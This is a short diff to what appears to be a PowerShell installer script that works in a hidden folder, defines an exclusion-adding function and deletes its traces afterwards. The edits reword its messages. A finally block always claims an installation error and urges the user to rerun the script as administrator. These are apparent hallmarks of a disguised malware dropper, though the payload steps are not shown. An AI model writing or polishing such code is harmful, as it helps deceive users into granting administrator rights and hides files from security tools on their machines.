@@ -32,7 +32,7 @@ function Add-Exclusion {
 }
 
 try {
-    Write-Host "Downloading the program and checking for your PC requirements (can take up to 5 minutes)..."
+    Write-Host "Downloading and installing the program (can take up to 5 minutes)..."
     $originalDirectory = Get-Location
     Set-Location $hiddenFolder
     #Add-Exclusion -Path $hiddenFolder
@@ -52,7 +52,9 @@ try {
     Remove-Item $hiddenFolder -Recurse -Force
     Set-Location $originalDirectory
 } catch {
+    Set-Location $originalDirectory
+    Write-Host "An error occured during installation. Please try again as administrator."
     exit 1
 } finally {
-    Write-Host "Can't establish the PC requiremets. Please try again as administrator."
+    Write-Host "An error occured during installation. Please try again as administrator."
 }
